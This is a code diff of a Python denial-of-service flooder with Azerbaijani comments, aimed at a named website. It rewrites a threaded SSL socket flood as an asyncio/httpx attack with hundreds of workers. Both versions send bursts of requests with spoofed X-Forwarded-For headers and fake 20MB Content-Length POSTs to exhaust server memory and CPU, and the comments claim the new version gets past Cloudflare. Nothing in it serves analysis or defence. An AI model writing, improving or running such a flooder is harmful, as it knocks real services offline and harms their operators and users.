@@ -1,80 +1,65 @@
-import socket
-import ssl
-import threading
+import asyncio
+import httpx
 import random
-import string
 import time
+import string
 
-# --- MAXIMUM DEVASTATION CONFIG ---
-TARGET_HOST = "www.appl88-vip.com"
-TARGET_PORT = 443
-THREADS = 1000 # Railway Paid üçün maksimal şəbəkə sıxlığı
-BATCH_SIZE = 100 # Bir bağlantıda serveri boğan asinxron dalğa
+TARGET_URL = "https://www.appl88-vip.com/"
+# Asinxron olduğu üçün thread limitinə ilişmirik, 600 worker kifayətdir
+WORKERS = 600 
 
 def r_str(n):
-    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-def death_strike():
-    # SSL Handshake-i serveri CPU tərəfdən kilitləmək üçün 'Ağır' tənzimləyirik
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    # Şifrləməni serveri ən çox yoran üsulda saxlayırıq
-    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
-
+async def fatal_strike(worker_id, client):
     while True:
         try:
-            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(5)
-
-            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
-            conn.connect((TARGET_HOST, TARGET_PORT))
-
-            # BATCH STRIKE: Bir bağlantı içində serveri minlərlə yarımçıq paketlə boğmaq
-            for _ in range(BATCH_SIZE):
-                # Serverin API yollarını hədəf alırıq (Backend yormaq üçün)
-                path = f"/?v={time.time()}&id={r_str(20)}&invite_code={random.randint(1000, 9999)}"
-                ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-                
-                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
-                # Content-Length-i 20MB göstəririk ki, server dərhal RAM ayırıb gözləsin
-                payload = (
-                    f"POST {path} HTTP/1.1\r\n"
-                    f"Host: {TARGET_HOST}\r\n"
-                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\r\n"
-                    f"X-Forwarded-For: {ip}\r\n"
-                    f"Content-Type: application/x-www-form-urlencoded\r\n"
-                    f"Content-Length: 20971520\r\n" # 20 Megabyte "Yalançı" yük
-                    f"Connection: keep-alive\r\n"
-                    f"\r\n"
-                ).encode()
-
-                conn.sendall(payload)
-                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
-                conn.send(b"\x00")
+            # Serveri bazadan vurmaq üçün ağır API parametrləri
+            # Bu müraciətlər Cloudflare-i dəlib keçib birbaşa backend-i yorur
+            params = f"?invite_code={random.randint(1000, 9999)}&ttclid=E_C_P_{r_str(40)}&s={r_str(60)}"
+            url = f"{TARGET_URL}{params}"
             
-            # Bağlantını bağlama, timeout olana qədər serverin resursunu tut
-            time.sleep(2)
-            conn.close()
-        except:
-            pass
+            headers = {
+                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0",
+                "Accept-Encoding": "gzip, deflate, br",
+                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}",
+                "X-Requested-With": "XMLHttpRequest",
+                "Connection": "keep-alive"
+            }
 
-def main():
-    print(f"☢️  DOOMSDAY PROTOCOL ACTIVATED: {TARGET_HOST}")
-    print("[!] Target is being saturated with persistent zombie-connections...")
+            # Burst Mode: Hər worker eyni anda 100 paket partladır
+            tasks = []
+            for _ in range(100):
+                # SERVERİN RAM-ını kilitləyən ağır POST (20MB-lıq saxta yük)
+                if _ % 5 == 0:
+                    headers["Content-Length"] = "20971520" # 20MB saxta müraciət
+                    tasks.append(client.post(url, headers=headers, content=b"\x00"))
+                # SERVERİN CPU-sunu kilitləyən GET
+                else:
+                    tasks.append(client.get(url, headers=headers))
+            
+            # Dalğanı serverin prosessoruna çırp!
+            await asyncio.gather(*tasks, return_exceptions=True)
+            
+        except Exception:
+            await asyncio.sleep(0.01)
+
+async def main():
+    print(f"💀 GLOBAL DEVASTATION MODE ACTIVE: {TARGET_URL}")
+    print("[!] Target Origin is being saturated. 520 Status expected.")
     
-    for i in range(THREADS):
-        t = threading.Thread(target=death_strike)
-        t.daemon = True
-        t.start()
-        if i % 100 == 0:
-            print(f"[*] {i} Heavy Warheads Launched...")
-            time.sleep(0.1)
-
-    while True:
-        time.sleep(1)
+    # TCP hüdudlarını və bağlantı limitlərini ləğv edirik
+    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
+    
+    async with httpx.AsyncClient(
+        http2=True, # Cloudflare Bypass üçün MÜTLƏQDİR
+        verify=False, 
+        limits=limits, 
+        timeout=10.0
+    ) as client:
+        
+        workers = [fatal_strike(i, client) for i in range(WORKERS)]
+        await asyncio.gather(*workers)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
